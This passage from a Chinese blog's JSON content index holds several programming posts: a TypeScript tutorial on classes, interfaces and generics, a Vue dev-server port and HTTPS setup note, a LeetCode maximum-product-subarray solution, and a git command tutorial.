&#125;&#125;let a = new Animal('Jack');console.log(a.sayHi()); // My name is Jack 类的继承使用 extends 关键字实现继承，子类中使用 super 关键字来调用父类的构造函数和方法。 123456789101112class Cat extends Animal &#123; constructor(name) &#123; super(name); // 调用父类的 constructor(name) console.log(this.name); &#125; sayHi() &#123; return 'Meow, ' + super.sayHi(); // 调用父类的 sayHi() &#125;&#125;let c = new Cat('Tom'); // Tomconsole.log(c.sayHi()); // Meow, My name is Tom 存取器使用 getter 和 setter 可以改变属性的赋值和读取行为： 123456789101112131415class Animal &#123; constructor(name) &#123; this.name = name; &#125; get name() &#123; return 'Jack'; &#125; set name(value) &#123; console.log('setter: ' + value); &#125;&#125;let a = new Animal('Kitty'); // setter: Kittya.name = 'Tom'; // setter: Tomconsole.log(a.name); // Jack 静态方法使用 static 修饰符修饰的方法称为静态方法，它们不需要实例化，而是直接通过类来调用： 123456789class Animal &#123; static isAnimal(a) &#123; return a instanceof Animal; &#125;&#125;let a = new Animal('Jack');Animal.isAnimal(a); // truea.isAnimal(a); // TypeError: a.isAnimal is not a function ES7 中类的用法ES7 中有一些关于类的提案，TypeScript 也实现了它们，这里做一个简单的介绍。 实例属性ES6 中实例的属性只能通过构造函数中的 this.xxx 来定义，ES7 提案中可以直接在类里面定义： 12345678910class Animal &#123; name = 'Jack'; constructor() &#123; // ... &#125;&#125;let a = new Animal();console.log(a.name); // Jack 静态属性ES7 提案中，可以使用 static 定义一个静态属性： 123456789class Animal &#123; static num = 42; constructor() &#123; // ... &#125;&#125;console.log(Animal.num); // 42 TypeScript 中类的用法public private 和 protectedTypeScript 可以使用三种访问修饰符（Access Modifiers），分别是 public、private 和 protected。 public 修饰的属性或方法是公有的，可以在任何地方被访问到，默认所有的属性和方法都是 public 的 private 修饰的属性或方法是私有的，不能在声明它的类的外部访问 protected 修饰的属性或方法是受保护的，它和 private 类似，区别是它在子类中也是允许被访问的下面举一些例子： 1234567891011class Animal &#123; public name; public constructor(name) &#123; this.name = name; &#125;&#125;let a = new Animal('Jack');console.log(a.name); // Jacka.name = 'Tom';console.log(a.name); // Tom 上面的例子中，name 被设置为了 public，所以直接访问实例的 name 属性是允许的。 很多时候，我们希望有的属性是无法直接存取的，这时候就可以用 private 了： 12345678910111213class Animal &#123; private name; public constructor(name) &#123; this.name = name; &#125;&#125;let a = new Animal('Jack');console.log(a.name); // Jacka.name = 'Tom';// index.ts(9,13): error TS2341: Property 'name' is private and only accessible within class 'Animal'.// index.ts(10,1): error TS2341: Property 'name' is private and only accessible within class 'Animal'. 需要注意的是，TypeScript 编译之后的代码中，并没有限制 private 属性在外部的可访问性。 上面的例子编译后的代码是： 123456789var Animal = (function () &#123; function Animal(name) &#123; this.name = name; &#125; return Animal;&#125;)();var a = new Animal('Jack');console.log(a.name);a.name = 'Tom'; 使用 private 修饰的属性或方法，在子类中也是不允许访问的： 123456789101112131415class Animal &#123; private name; public constructor(name) &#123; this.name = name; &#125;&#125;class Cat extends Animal &#123; constructor(name) &#123; super(name); console.log(this.name); &#125;&#125;// index.ts(11,17): error TS2341: Property 'name' is private and only accessible within class 'Animal'. 而如果是用 protected 修饰，则允许在子类中访问： 12345678910111213class Animal &#123; protected name; public constructor(name) &#123; this.name = name; &#125;&#125;class Cat extends Animal &#123; constructor(name) &#123; super(name); console.log(this.name); &#125;&#125; 当构造函数修饰为 private 时，该类不允许被继承或者实例化： 12345678910111213141516class Animal &#123; public name; private constructor(name) &#123; this.name = name; &#125;&#125;class Cat extends Animal &#123; constructor(name) &#123; super(name); &#125;&#125;let a = new Animal('Jack');// index.ts(7,19): TS2675: Cannot extend a class 'Animal'. Class constructor is marked as private.// index.ts(13,9): TS2673: Constructor of class 'Animal' is private and only accessible within the class declaration. 当构造函数修饰为 protected 时，该类只允许被继承： 123456789101112131415class Animal &#123; public name; protected constructor(name) &#123; this.name = name; &#125;&#125;class Cat extends Animal &#123; constructor(name) &#123; super(name); &#125;&#125;let a = new Animal('Jack');// index.ts(13,9): TS2674: Constructor of class 'Animal' is protected and only accessible within the class declaration. 参数属性修饰符和readonly还可以使用在构造函数参数中，等同于类中定义该属性同时给该属性赋值，使代码更简洁。 123456class Animal &#123; // public name: string; public constructor(public name) &#123; // this.name = name; &#125;&#125; readonly只读属性关键字，只允许出现在属性声明或索引签名或构造函数中。 123456789101112class Animal &#123; readonly name; public constructor(name) &#123; this.name = name; &#125;&#125;let a = new Animal('Jack');console.log(a.name); // Jacka.name = 'Tom';// index.ts(10,3): TS2540: Cannot assign to 'name' because it is a read-only property. 注意如果 readonly 和其他访问修饰符同时存在的话，需要写在其后面。 123456class Animal &#123; // public readonly name; public constructor(public readonly name) &#123; // this.name = name; &#125;&#125; 抽象类abstract 用于定义抽象类和其中的抽象方法。 什么是抽象类？ 首先，抽象类是不允许被实例化的： 1234567891011abstract class Animal &#123; public name; public constructor(name) &#123; this.name = name; &#125; public abstract sayHi();&#125;let a = new Animal('Jack');// index.ts(9,11): error TS2511: Cannot create an instance of the abstract class 'Animal'. 上面的例子中，我们定义了一个抽象类 Animal，并且定义了一个抽象方法 sayHi。在实例化抽象类的时候报错了。 其次，抽象类中的抽象方法必须被子类实现： 1234567891011121314151617abstract class Animal &#123; public name; public constructor(name) &#123; this.name = name; &#125; public abstract sayHi();&#125;class Cat extends Animal &#123; public eat() &#123; console.log(`$&#123;this.name&#125; is eating.`); &#125;&#125;let cat = new Cat('Tom');// index.ts(9,7): error TS2515: Non-abstract class 'Cat' does not implement inherited abstract member 'sayHi' from class 'Animal'. 上面的例子中，我们定义了一个类 Cat 继承了抽象类 Animal，但是没有实现抽象方法 sayHi，所以编译报错了。 下面是一个正确使用抽象类的例子： 123456789101112131415abstract class Animal &#123; public name; public constructor(name) &#123; this.name = name; &#125; public abstract sayHi();&#125;class Cat extends Animal &#123; public sayHi() &#123; console.log(`Meow, My name is $&#123;this.name&#125;`); &#125;&#125;let cat = new Cat('Tom'); 上面的例子中，我们实现了抽象方法 sayHi，编译通过了。 需要注意的是，即使是抽象方法，TypeScript 的编译结果中，仍然会存在这个类，上面的代码的编译结果是： 1234567891011121314151617181920212223242526var __extends = (this &amp;&amp; this.__extends) || function (d, b) &#123; for (var p in b) if (b.hasOwnProperty(p)) d[p] = b[p]; function __() &#123; this.constructor = d; &#125; d.prototype = b === null ? Object.create(b) : ((__.prototype = b.prototype), new __()); &#125;;var Animal = (function () &#123; function Animal(name) &#123; this.name = name; &#125; return Animal;&#125;)();var Cat = (function (_super) &#123; __extends(Cat, _super); function Cat() &#123; _super.apply(this, arguments); &#125; Cat.prototype.sayHi = function () &#123; console.log('Meow, My name is ' + this.name); &#125;; return Cat;&#125;)(Animal);var cat = new Cat('Tom'); 类的类型给类加上 TypeScript 的类型很简单，与接口类似： 123456789101112class Animal &#123; name: string; constructor(name: string) &#123; this.name = name; &#125; sayHi(): string &#123; return `My name is $&#123;this.name&#125;`; &#125;&#125;let a: Animal = new Animal('Jack');console.log(a.sayHi()); // My name is Jack 类与接口之前学习过，接口（Interfaces）可以用于对「对象的形状（Shape）」进行描述。 这一章主要介绍接口的另一个用途，对类的一部分行为进行抽象。 类实现接口实现（implements）是面向对象中的一个重要概念。一般来讲，一个类只能继承自另一个类，有时候不同类之间可以有一些共有的特性，这时候就可以把特性提取成接口（interfaces），用 implements 关键字来实现。这个特性大大提高了面向对象的灵活性。 举例来说，门是一个类，防盗门是门的子类。如果防盗门有一个报警器的功能，我们可以简单的给防盗门添加一个报警方法。这时候如果有另一个类，车，也有报警器的功能，就可以考虑把报警器提取出来，作为一个接口，防盗门和车都去实现它： 123456789101112131415161718interface Alarm &#123; alert(): void;&#125;class Door &#123;&#125;class SecurityDoor extends Door implements Alarm &#123; alert() &#123; console.log('SecurityDoor alert'); &#125;&#125;class Car implements Alarm &#123; alert() &#123; console.log('Car alert'); &#125;&#125; 一个类可以实现多个接口： 1234567891011121314151617181920interface Alarm &#123; alert(): void;&#125;interface Light &#123; lightOn(): void; lightOff(): void;&#125;class Car implements Alarm, Light &#123; alert() &#123; console.log('Car alert'); &#125; lightOn() &#123; console.log('Car light on'); &#125; lightOff() &#123; console.log('Car light off'); &#125;&#125; 上例中，Car 实现了 Alarm 和 Light 接口，既能报警，也能开关车灯。 接口继承接口接口与接口之间可以是继承关系： 12345678interface Alarm &#123; alert(): void;&#125;interface LightableAlarm extends Alarm &#123; lightOn(): void; lightOff(): void;&#125; 这很好理解，LightableAlarm 继承了 Alarm，除了拥有 alert 方法之外，还拥有两个新方法 lightOn 和 lightOff。 接口继承类常见的面向对象语言中，接口是不能继承类的，但是在 TypeScript 中却是可以的： 1234567891011121314class Point &#123; x: number; y: number; constructor(x: number, y: number) &#123; this.x = x; this.y = y; &#125;&#125;interface Point3d extends Point &#123; z: number;&#125;let point3d: Point3d = &#123;x: 1, y: 2, z: 3&#125;; 为什么 TypeScript 会支持接口继承类呢？ 实际上，当我们在声明 class Point 时，除了会创建一个名为 Point 的类之外，同时也创建了一个名为 Point 的类型（实例的类型）。 所以我们既可以将 Point 当做一个类来用（使用 new Point 创建它的实例）： 12345678910class Point &#123; x: number; y: number; constructor(x: number, y: number) &#123; this.x = x; this.y = y; &#125;&#125;const p = new Point(1, 2); 也可以将 Point 当做一个类型来用（使用 : Point 表示参数的类型）： 1234567891011121314class Point &#123; x: number; y: number; constructor(x: number, y: number) &#123; this.x = x; this.y = y; &#125;&#125;function printPoint(p: Point) &#123; console.log(p.x, p.y);&#125;printPoint(new Point(1, 2)); 这个例子实际上可以等价于： 12345678910111213141516171819class Point &#123; x: number; y: number; constructor(x: number, y: number) &#123; this.x = x; this.y = y; &#125;&#125;interface PointInstanceType &#123; x: number; y: number;&#125;function printPoint(p: PointInstanceType) &#123; console.log(p.x, p.y);&#125;printPoint(new Point(1, 2)); 上例中我们新声明的 PointInstanceType 类型，与声明 class Point 时创建的 Point 类型是等价的。 所以回到 Point3d 的例子中，我们就能很容易的理解为什么 TypeScript 会支持接口继承类了： 1234567891011121314151617181920class Point &#123; x: number; y: number; constructor(x: number, y: number) &#123; this.x = x; this.y = y; &#125;&#125;interface PointInstanceType &#123; x: number; y: number;&#125;// 等价于 interface Point3d extends PointInstanceTypeinterface Point3d extends Point &#123; z: number;&#125;let point3d: Point3d = &#123;x: 1, y: 2, z: 3&#125;; 当我们声明 interface Point3d extends Point 时，Point3d 继承的实际上是类 Point 的实例的类型。 换句话说，可以理解为定义了一个接口 Point3d 继承另一个接口 PointInstanceType。 所以「接口继承类」和「接口继承接口」没有什么本质的区别。 值得注意的是，PointInstanceType 相比于 Point，缺少了 constructor 方法，这是因为声明 Point 类时创建的 Point 类型是不包含构造函数的。另外，除了构造函数是不包含的，静态属性或静态方法也是不包含的（实例的类型当然不应该包括构造函数、静态属性或静态方法）。 换句话说，声明 Point 类时创建的 Point 类型只包含其中的实例属性和实例方法： 123456789101112131415161718192021222324252627282930class Point &#123; /** 静态属性，坐标系原点 */ static origin = new Point(0, 0); /** 静态方法，计算与原点距离 */ static distanceToOrigin(p: Point) &#123; return Math.sqrt(p.x * p.x + p.y * p.y); &#125; /** 实例属性，x 轴的值 */ x: number; /** 实例属性，y 轴的值 */ y: number; /** 构造函数 */ constructor(x: number, y: number) &#123; this.x = x; this.y = y; &#125; /** 实例方法，打印此点 */ printPoint() &#123; console.log(this.x, this.y); &#125;&#125;interface PointInstanceType &#123; x: number; y: number; printPoint(): void;&#125;let p1: Point;let p2: PointInstanceType; 上例中最后的类型 Point 和类型 PointInstanceType 是等价的。 同样的，在接口继承类的时候，也只会继承它的实例属性和实例方法。 泛型泛型（Generics）是指在定义函数、接口或类的时候，不预先指定具体的类型，而在使用的时候再指定类型的一种特性。 简单的例子首先，我们来实现一个函数 createArray，它可以创建一个指定长度的数组，同时将每一项都填充一个默认值： 123456789function createArray(length: number, value: any): Array&lt;any&gt; &#123; let result = []; for (let i = 0; i &lt; length; i++) &#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x'); // ['x', 'x', 'x'] 上例中，我们使用了之前提到过的数组泛型来定义返回值的类型。 这段代码编译不会报错，但是一个显而易见的缺陷是，它并没有准确的定义返回值的类型： ```允许数组的每一项都为任意类型。但是我们预期的是，数组中每一项都应该是输入的 value 的类型。12345678910111213这时候，泛型就派上用场了：&#96;&#96;&#96;javascriptfunction createArray&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123; let result: T[] &#x3D; []; for (let i &#x3D; 0; i &lt; length; i++) &#123; result[i] &#x3D; value; &#125; return result;&#125;createArray&lt;string&gt;(3, &#39;x&#39;); &#x2F;&#x2F; [&#39;x&#39;, &#39;x&#39;, &#39;x&#39;] 上例中，我们在函数名后添加了 &lt;T&gt;，其中 T 用来指代任意输入的类型，在后面的输入value: T和输出 Array&lt;T&gt;中即可使用了。 接着在调用的时候，可以指定它具体的类型为 string。当然，也可以不手动指定，而让类型推论自动推算出来： 123456789function createArray&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123; let result: T[] = []; for (let i = 0; i &lt; length; i++) &#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x'); // ['x', 'x', 'x'] 多个类型参数定义泛型的时候，可以一次定义多个类型参数： 12345function swap&lt;T, U&gt;(tuple: [T, U]): [U, T] &#123; return [tuple[1], tuple[0]];&#125;swap([7, 'seven']); // ['seven', 7] 上例中，我们定义了一个 swap 函数，用来交换输入的元组。 泛型约束在函数内部使用泛型变量的时候，由于事先不知道它是哪种类型，所以不能随意的操作它的属性或方法： 123456function loggingIdentity&lt;T&gt;(arg: T): T &#123; console.log(arg.length); return arg;&#125;// index.ts(2,19): error TS2339: Property 'length' does not exist on type 'T'. 上例中，泛型 T 不一定包含属性 length，所以编译的时候报错了。 这时，我们可以对泛型进行约束，只允许这个函数传入那些包含 length 属性的变量。这就是泛型约束： 12345678interface Lengthwise &#123; length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg: T): T &#123; console.log(arg.length); return arg;&#125; 上例中，我们使用了 extends 约束了泛型 T 必须符合接口 Lengthwise 的形状，也就是必须包含 length 属性。 此时如果调用 loggingIdentity 的时候，传入的 arg 不包含 length，那么在编译阶段就会报错了： 123456789101112interface Lengthwise &#123; length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg: T): T &#123; console.log(arg.length); return arg;&#125;loggingIdentity(7);// index.ts(10,17): error TS2345: Argument of type '7' is not assignable to parameter of type 'Lengthwise'. 多个类型参数之间也可以互相约束： 12345678910function copyFields&lt;T extends U, U&gt;(target: T, source: U): T &#123; for (let id in source) &#123; target[id] = (&lt;T&gt;source)[id]; &#125; return target;&#125;let x = &#123; a: 1, b: 2, c: 3, d: 4 &#125;;copyFields(x, &#123; b: 10, d: 20 &#125;); 上例中，我们使用了两个类型参数，其中要求 T 继承 U，这样就保证了 U 上不会出现 T 中不存在的字段。 泛型接口之前学习过，可以使用接口的方式来定义一个函数需要符合的形状： 12345678interface SearchFunc &#123; (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(source: string, subString: string) &#123; return source.search(subString) !== -1;&#125; 当然也可以使用含有泛型的接口来定义函数的形状： 1234567891011121314interface CreateArrayFunc &#123; &lt;T&gt;(length: number, value: T): Array&lt;T&gt;;&#125;let createArray: CreateArrayFunc;createArray = function&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123; let result: T[] = []; for (let i = 0; i &lt; length; i++) &#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x'); // ['x', 'x', 'x'] 进一步，我们可以把泛型参数提前到接口名上： 1234567891011121314interface CreateArrayFunc&lt;T&gt; &#123; (length: number, value: T): Array&lt;T&gt;;&#125;let createArray: CreateArrayFunc&lt;any&gt;;createArray = function&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123; let result: T[] = []; for (let i = 0; i &lt; length; i++) &#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x'); // ['x', 'x', 'x'] 注意，此时在使用泛型接口的时候，需要定义泛型的类型。 泛型类与泛型接口类似，泛型也可以用于类的类型定义中： 12345678class GenericNumber&lt;T&gt; &#123; zeroValue: T; add: (x: T, y: T) =&gt; T;&#125;let myGenericNumber = new GenericNumber&lt;number&gt;();myGenericNumber.zeroValue = 0;myGenericNumber.add = function(x, y) &#123; return x + y; &#125;; 泛型参数的默认类型在 TypeScript 2.3 以后，我们可以为泛型中的类型参数指定默认类型。当使用泛型时没有在代码中直接指定类型参数，从实际值参数中也无法推测出时，这个默认类型就会起作用。 1234567function createArray&lt;T = string&gt;(length: number, value: T): Array&lt;T&gt; &#123; let result: T[] = []; for (let i = 0; i &lt; length; i++) &#123; result[i] = value; &#125; return result;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"typescript","slug":"技术/前端/typescript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/typescript/"}],"tags":[]},{"title":"vue修改端口号和开启https","slug":"vue修改端口号和开启https","date":"2020-06-14T16:00:00.000Z","updated":"2024-05-25T02:28:45.259Z","comments":true,"path":"2020/06/15/vue修改端口号和开启https/","link":"","permalink":"https://wtaufpziv.github.io/2020/06/15/vue%E4%BF%AE%E6%94%B9%E7%AB%AF%E5%8F%A3%E5%8F%B7%E5%92%8C%E5%BC%80%E5%90%AFhttps/","excerpt":"vue开发环境修改本地启动的端口号","text":"vue开发环境修改本地启动的端口号 当我们使用脚手架搭建项目时，react当中开发环境默认端口号是3000，vue是8080，我们也可以手动修改这个端口号。 VUE 2.Xconfig文件夹中有一个index.js其中部分内容如下，port即为端口号，在这里更改即可。 123456789101112131415module.exports = &#123; dev: &#123; env: require('./dev.env'), port: 8080, // 端口号 assetsSubDirectory: 'static', assetsPublicPath: '/', proxyTable: &#123;&#125;, // CSS Sourcemaps off by default because relative paths are \"buggy\" // with this option, according to the CSS-Loader README // (https://github.com/webpack/css-loader#sourcemaps) // In our experience, they generally work as expected, // just be aware of this issue when enabling this option. cssSourceMap: false, &#125;&#125;; VUE 3.Xvue3版本之后使用脚手架搭建的项目不再有暴露的配置文件，而是将默认设置放在了node_module中，因此当我们需要配置vue项目时需要在根目录手动床架一个文件vue.config.js 创建之后进行如下配置： 12345module.exports = &#123; devServer: &#123; port: 8080, // 端口号 &#125;&#125;; VUE设置https启动有时候我们在本地调试需要开启https，但是脚手架搭建的项目，默认是不开启https的，同样的在vue.config.js中设置： 1234devServer: &#123; //.... https: true &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"Vue","slug":"技术/前端/Vue","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/Vue/"}],"tags":[]},{"title":"leetcode-乘积最大子数组","slug":"leetcode-乘积最大子数组","date":"2020-06-09T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/06/10/leetcode-乘积最大子数组/","link":"","permalink":"https://wtaufpziv.github.io/2020/06/10/leetcode-%E4%B9%98%E7%A7%AF%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84/","excerpt":"乘积最大子数组（难度：中等）给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。 示例1： 输入: [2,3,-2,4]输出: 6解释: 子数组 [2,3] 有最大乘积 6。 示例2： 输入: [-2,0,-1]输出: 0解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。","text":"乘积最大子数组（难度：中等）给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。 示例1： 输入: [2,3,-2,4]输出: 6解释: 子数组 [2,3] 有最大乘积 6。 示例2： 输入: [-2,0,-1]输出: 0解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。 结题思路:做这道题时如果做过前面leetcode的数列最大字段和，很容易联想到相同的动态规划算法。例如[5, 6, -3, 4, -3]，用之前的想法，我们很容易得出状态转移方程：就是对于当前元素，要么加入到他前面元素的段中，要么自己做一个新段。这个时候很容易得出下面这个dp数组：[5， 30， -3， 4， -3]，于是得出答案是30 但是很明显答案是错的，数组所有元素相乘结果5x6x(-3)x4x(-3)才是最大的值。出现这个问题的原因是我们这个办法没考虑数组中负数的情况，而把他们粗暴地一步步相乘对比。 我们可以根据正负性进行分类讨论。 考虑当前位置如果是一个负数的话，那么我们希望以它前一个位置结尾的段的积也是个负数，这样就可以负负得正，并且我们希望这个积尽可能「负得更多」，即尽可能小。如果当前位置是一个正数的话，我们更希望以它前一个位置结尾的某个段的积也是个正数，并且希望它尽可能地大。 综上所述，这道题我们需要维护两个状态数组，一个保存截止到当前元素最大的乘积，另一个保存截止到当前，最小的乘积 状态转移方程如下：以上面提到的例子为例：[5, 6, -3, 4, -3] 5 6 -3 4 -3 Fmax 5 30 -3 4 1080 Fmin 5 6 -90 -360 -12 在Fmax中找到最大值1080就是这道题的答案 代码如下： 12345678910111213var maxProduct = function(nums) &#123; let len = nums.length if(len === 0)&#123; return 0 &#125; let Fmax =[], Fmin = [] Fmax[0] = Fmin[0] = nums[0] for(let i = 1; i &lt; len; i++)&#123; Fmax[i] = Math.max(Fmax[i - 1] * nums[i], Fmin[i - 1] * nums[i], nums[i]) Fmin[i] = Math.min(Fmax[i - 1] * nums[i], Fmin[i - 1] * nums[i], nums[i]) &#125; return Math.max.apply(null, Fmax)&#125;;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"git版本管理复习","slug":"git版本管理复习","date":"2020-06-06T16:00:00.000Z","updated":"2024-05-25T04:21:30.275Z","comments":true,"path":"2020/06/07/git版本管理复习/","link":"","permalink":"https://wtaufpziv.github.io/2020/06/07/git%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%A4%8D%E4%B9%A0/","excerpt":"git版本管理工具复习资料来源：Learn Git Branching git仓库初始化1git init 我们初始化完成仓库之后就可以往对应的目录添加文件 假设现在我们编写一个了readme.txt文件，那么我们要使用git管理控制这个文件，还需要将这个文件添加到仓库，而不是仅仅将它放在仓库所在的文件夹 1git add readme.txt 注意：git add不仅可以添加单个文件，还可以添加文件夹，这样文件夹中任意文件的变化都可以由git进行监控与管理","text":"git版本管理工具复习资料来源：Learn Git Branching git仓库初始化1git init 我们初始化完成仓库之后就可以往对应的目录添加文件 假设现在我们编写一个了readme.txt文件，那么我们要使用git管理控制这个文件，还需要将这个文件添加到仓库，而不是仅仅将它放在仓库所在的文件夹 1git add readme.txt 注意：git add不仅可以添加单个文件，还可以添加文件夹，这样文件夹中任意文件的变化都可以由git进行监控与管理 踏上征途——git本地仓库操作循序渐进，了解git主要命令git commit在初始化阶段我们创建了本地仓库，当文件发生改动，我们就可以将这个改动提交到本地仓库进行保存 实际上可以这么理解，git仓库保存的是你添加到仓库的所有文件的一个快照，每次进行提交git都会将新快照和旧快照进行对比，找出所有差异并保存为一个提交记录。 多次提交之后，git依然会为我们保存之前所有的提交记录 指令语句：1git commit -mm：每次提交的额外信息，这个信息是可选的，但是强烈建议写上，因为这标识了每次提交的改动信息，为我们之后的版本管理提供了重要的依据 假设我们现有仓库：执行命令：1git commit git branchgit的分支简单来说就是基于同一个提交历史进行不同的工作，当这些工作完成之后再将他们合并起来。这是团队合作开发的核心理念。 git的分支是非常轻量的，即使一个仓库建立了诸多分支，也不会对内存资源带来大的消耗。 假设现有仓库：执行：1git branch newImage 这时我们执行：1git commit master分支前进，但newImage分支原地不动，因为我们当前实在master分支上进行工作（图中的星号） 当然我们也可以切换到另一个分支进行工作,使用checkout 12git checkout newImagegit commit git merge当我们的开发者们在不同的分支上完成工作之后，就需要将这些工作进行整合了，这就是分支的合并 当我们使用git merge时会产生一个特殊的提交记录，这个提交记录有两个父节点 假设现有如下仓库：当前工作在master分支，执行： 1git merge bugFix 可以很清楚的看到，使用merge合并分支之后，master分支就拥有了c2上的所有改动。 而对于bugFix分支，同样也可以通过merge，获得c3上的所有改动 12git checkout bugFixgit merge master git rebase这个指令也是用来合并分支的，听上去和merge功能相同，但是它却和merge有着一定的区别。 之前的merge指令就像将两个分支的河流最终汇合成为一条河流，汇合之后，两条河流汇合之前的部分依然存在。 但是rebase更像是将其中一条河流的水全部取出，倒入另一条河流，之后直接将其填平。显然这样合并之后，被取水的那条河流不复存在。 假设现有仓库：1git rebase master 可以看到bugFix上的修改记录c3被直接复制粘贴到了master分支顶端成为c3(副本)，同时原先的修改记录（图中暗掉的c3）将不复存在，无法再访问到。 git超棒特性——版本移动分离HEADHEAD可以理解为一个指针，它默认总是指向当前分支上的最近一次提交记录，大多数修改提交树的命令都是从分离HEAD开始的 假设现有仓库：12git commit git checkout c2 相对引用我们之前的例子当中“c1”、“c2”等等这些，其实就是我们每次提交的唯一标识符。它在实际的git仓库中是一串哈希值，共40位。 显然我们之前用到哈希值的操作，需要我们每次都要去通过git log获取每一次提交的哈希值。 类似于这样的哈希值：fed2da64c0efc5293610bdd892f82a58e8cbc5d8 不过好消息是，我们不一定要输完整的哈希值，我们可以仅仅输入fed2，这样就可以了 然而即使是这样，如果每一次我们进行版本移动都要哈希值很明显是不方便的，于是就有了相对引用的方法 使用^向上移动一个提交记录，使用~[num]向上移动num个提交记录 假设现有如下仓库：1git checkout master^ 当然也可以使用~1git checkout HEAD~4 强制修改分支位置我们可以使用branch -f强制让分支指向一个提交记录 1git branch -f master HEAD~3 撤销更改git reset 通过把分支记录回退几个提交记录来实现撤销改动。你可以将这想象成“改写历史”。git reset 向上移动分支，原来指向的提交记录就跟从来没有提交过一样。 1git reset HEAD~1 虽然在你的本地分支中使用 git reset 很方便，但是这种“改写历史”的方法对大家一起使用的远程分支是无效的 为了撤销更改并分享给别人，我们需要使用 git revert 1git revert HEAD 这是因为新提交记录 C2’ 引入了更改 —— 这些更改刚好是用来撤销 C2 这个提交的。也就是说 C2’ 的状态与 C1 是相同的。 revert 之后就可以把你的更改推送到远程仓库与别人分享了 自由修改提交树git cherry-pick如果你想将一些提交复制到当前所在的位置（HEAD）下面的话， Cherry-pick 是最直接的方式了，这个功能看起来和rebase很像，但是使用上是有区别的1git cherry-pick c2 c4我们只需要提交记录 C2 和 C4，所以 Git 就将被它们抓过来放到当前分支下了。 交互式的rebase当你知道你所需要的提交记录（并且还知道这些提交记录的哈希值）时, 用 cherry-pick 再好不过了 —— 没有比这更简单的方式了。 但是如果你不清楚你想要的提交记录的哈希值呢? 幸好 Git 帮你想到了这一点, 我们可以利用交互式的 rebase —— 如果你想从一系列的提交记录中找到想要的记录, 这就是最好的方法了 交互式 rebase 指的是使用带参数 –interactive 的 rebase 命令, 简写为 -i 如果你在命令后增加了这个选项, Git 会打开一个 UI 界面并列出将要被复制到目标分支的备选提交记录，它还会显示每个提交记录的哈希值和提交说明，提交说明有助于你理解这个提交进行了哪些更改。 在实际使用时，所谓的 UI 窗口一般会在文本编辑器 —— 如 Vim —— 中打开一个文件 当 rebase UI界面打开时, 你能做3件事: 调整提交记录的顺序（通过鼠标拖放来完成） 删除你不想要的提交（通过切换 pick 的状态来完成，关闭就意味着你不想要这个提交记录） 合并提交。 1git rebase -i HEAD~4 git tag相信通过前面课程的学习你已经发现了：分支很容易被人为移动，并且当有新的提交时，它也会移动。分支很容易被改变，大部分分支还只是临时的，并且还一直在变。 你可能会问了：有没有什么可以永远指向某个提交记录的标识呢，比如软件发布新的大版本，或者是修正一些重要的 Bug 或是增加了某些新特性，有没有比分支更好的可以永远指向这些提交的方法呢？ Git 的 tag 就是干这个用的啊，它们可以（在某种程度上 —— 因为标签可以被删除后重新在另外一个位置创建同名的标签）永久地将某个特定的提交命名为里程碑，然后就可以像分支一样引用了。 更难得的是，它们并不会随着新的提交而移动。你也不能检出到某个标签上面进行修改提交，它就像是提交树上的一个锚点，标识了某个特定的位置。 1git tag V1 c1 git describe由于标签在代码库中起着“锚点”的作用，Git 还为此专门设计了一个命令用来描述离你最近的锚点（也就是标签），它就是 git describe！ Git Describe 能帮你在提交历史中移动了多次以后找到方向；当你用 git bisect（一个查找产生 Bug 的提交记录的指令）找到某个提交记录时，或者是当你坐在你那刚刚度假回来的同事的电脑前时， 可能会用到这个命令 是时候分享了——远程仓库教程远程仓库并不复杂, 在如今的云计算盛行的世界很容易把远程仓库想象成一个富有魔力的东西, 但实际上它们只是你的仓库在另个一台计算机上的拷贝。你可以通过因特网与这台计算机通信 —— 也就是增加或是获取提交记录 话虽如此, 远程仓库却有一系列强大的特性 首先也是最重要的的点, 远程仓库是一个强大的备份。本地仓库也有恢复文件到指定版本的能力, 但所有的信息都是保存在本地的。有了远程仓库以后，即使丢失了本地所有数据, 